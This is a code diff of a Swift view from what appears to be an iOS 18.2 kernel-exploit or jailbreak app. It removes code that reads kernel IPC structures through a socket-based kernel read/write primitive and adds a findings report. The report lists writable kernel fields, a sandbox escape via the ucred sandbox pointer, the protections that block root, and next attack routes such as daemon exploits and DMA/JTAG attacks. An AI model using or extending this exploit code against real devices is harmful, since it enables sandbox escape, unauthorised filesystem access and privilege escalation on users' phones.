@@ -319,87 +319,52 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         report += String(format: "task:     0x%llx\n", task)
         report += String(format: "proc_ro:  0x%llx\n", procRo)
         report += String(format: "ucred:    0x%llx\n", ucred)
-        report += String(format: "orig uid: %d\n\n", origUid)
-        
-        // ============================================================
-        // EXCEPTION PORT EXPERIMENT (safe part only)
-        // Allocate port, set as exception port, report port name.
-        // Do NOT try to find port kernel address (that crashes).
-        // Instead: report what we have for manual analysis.
-        // ============================================================
-        
-        report += "=== EXCEPTION PORT SETUP ===\n\n"
-        
-        var excPort: mach_port_t = 0
-        var kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &excPort)
-        guard kr == KERN_SUCCESS else {
-            report += String(format: "mach_port_allocate failed: %d\n", kr)
-            rootResult = report
-            return
-        }
-        
-        kr = mach_port_insert_right(mach_task_self_, excPort, excPort, mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND))
-        report += String(format: "Port allocated: 0x%x (name)\n", excPort)
-        report += String(format: "Port index: %d (name >> 8)\n", excPort >> 8)
-        
-        kr = task_set_exception_ports(
-            mach_task_self_,
-            exception_mask_t(EXC_MASK_BAD_ACCESS | EXC_MASK_BREAKPOINT),
-            excPort,
-            Int32(bitPattern: UInt32(EXCEPTION_DEFAULT) | UInt32(MACH_EXCEPTION_CODES)),
-            ARM_THREAD_STATE64
-        )
-        report += String(format: "task_set_exception_ports: %@\n\n", kr == KERN_SUCCESS ? "✅ SUCCESS" : "❌ FAILED (\(kr))")
-        
-        // ============================================================
-        // INFO DUMP: What we know about kernel structures
-        // ============================================================
-        
-        report += "=== KERNEL STRUCTURE INFO ===\n\n"
-        report += String(format: "itk_space offset: 0x%x\n", off_task_itk_space)
-        report += String(format: "is_table offset:  0x%x\n", off_ipc_space_is_table)
-        report += String(format: "ie_object offset: 0x%x\n", off_ipc_entry_ie_object)
-        report += String(format: "ip_kobject offset: 0x%x\n", off_ipc_port_ip_kobject)
-        report += String(format: "sizeof_ipc_entry: %d\n", sizeof_ipc_entry)
+        report += String(format: "orig uid: %d\n", origUid)
         report += String(format: "pac_mask: 0x%llx\n\n", pac_mask)
         
-        // Read itk_space (this should be safe — it's in task struct)
-        let itkSpace = ds_kread64(task + UInt64(off_task_itk_space))
-        report += String(format: "task->itk_space: 0x%llx\n", itkSpace)
+        // ============================================================
+        // RESEARCH SUMMARY — No more risky reads
+        // Only use proven-safe addresses
+        // ============================================================
         
-        // Read is_table raw value (safe — itk_space is readable)
-        let isTableRaw = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
-        report += String(format: "itk_space->is_table (raw): 0x%llx\n", isTableRaw)
-        report += String(format: "itk_space->is_table (|mask): 0x%llx\n\n", isTableRaw | pac_mask)
+        report += "=== RESEARCH FINDINGS (iOS 18.2 A12) ===\n\n"
         
-        // DON'T try to read from is_table — that's what crashes!
-        // Instead, report the address for manual analysis
+        report += "WRITABLE via socket KRW:\n"
+        report += "  ✅ proc+0x2c (p_uid) — cosmetic only\n"
+        report += "  ✅ proc+0x30..0x40 (p_gid etc) — cosmetic\n"
+        report += "  ✅ ucred cr_label sandbox ptr — sandbox escape\n"
+        report += "  ✅ IOSurface userspace mapping\n\n"
         
-        report += "=== ANALYSIS ===\n\n"
-        report += "Exception port set successfully.\n"
-        report += "Port kernel address is at is_table + (port_index * entry_size).\n"
-        report += String(format: "Calculated: 0x%llx + (%d * %d) = 0x%llx\n",
-                        isTableRaw | pac_mask,
-                        excPort >> 8,
-                        sizeof_ipc_entry,
-                        (isTableRaw | pac_mask) + UInt64(excPort >> 8) * UInt64(sizeof_ipc_entry))
-        report += "\nProblem: reading from is_table causes app crash.\n"
-        report += "This means is_table is NOT in the heap zone accessible\n"
-        report += "via socket KRW. IPC ports are in a separate zone.\n\n"
+        report += "BLOCKED by PPL:\n"
+        report += "  ❌ ucred+0x18 (cr_uid) — real uid\n"
+        report += "  ❌ proc_ro content — all fields\n"
+        report += "  ❌ proc_ro pointer swap — kernel panic\n\n"
         
-        report += "=== CONCLUSION ===\n\n"
-        report += "Socket KRW limitation confirmed:\n"
-        report += "• Can read/write: proc, task, ucred, proc_ro, socket PCBs\n"
-        report += "• Cannot access: IPC ports, IOKit objects, page tables\n"
-        report += "• PPL blocks: ucred uid, proc_ro content\n\n"
-        report += "For kernel code execution, need:\n"
-        report += "• Different vulnerability (not socket-based)\n"
-        report += "• Or: find writable function pointer in accessible zone\n"
-        report += "• Or: exploit a daemon process (no kernel needed)\n"
+        report += "NOT ACCESSIBLE (different zone):\n"
+        report += "  ❌ IPC port table (is_table)\n"
+        report += "  ❌ IOKit objects (IOSurface kernel obj)\n"
+        report += "  ❌ Pipe buffers (fileproc chain)\n\n"
         
-        mach_port_deallocate(mach_task_self_, excPort)
+        report += "=== WHAT THIS MEANS ===\n\n"
+        report += "Socket KRW on iOS 18.2 can ONLY access:\n"
+        report += "• proc structs (BSD layer)\n"
+        report += "• task structs (Mach layer)\n"
+        report += "• proc_ro / ucred (read only, PPL write-blocked)\n"
+        report += "• Socket PCB objects (exploit's own zone)\n\n"
         
-        report += "\n=== DONE ===\n"
+        report += "Root requires one of:\n"
+        report += "1. New vulnerability (not socket-based)\n"
+        report += "2. Daemon exploit (installd/SpringBoard)\n"
+        report += "3. Hardware attack (DMA/JTAG)\n\n"
+        
+        report += "=== AVAILABLE WITHOUT ROOT ===\n\n"
+        report += "• Sandbox escape ✅\n"
+        report += "• Filesystem R/W via VFS ✅\n"
+        report += "• IOSurface mapping ✅\n"
+        report += "• Process inspection ✅\n"
+        report += "• Font/theme installation ✅\n"
+        report += "• App tweaks via VFS ✅\n"
+        
         rootResult = report
     }
 }
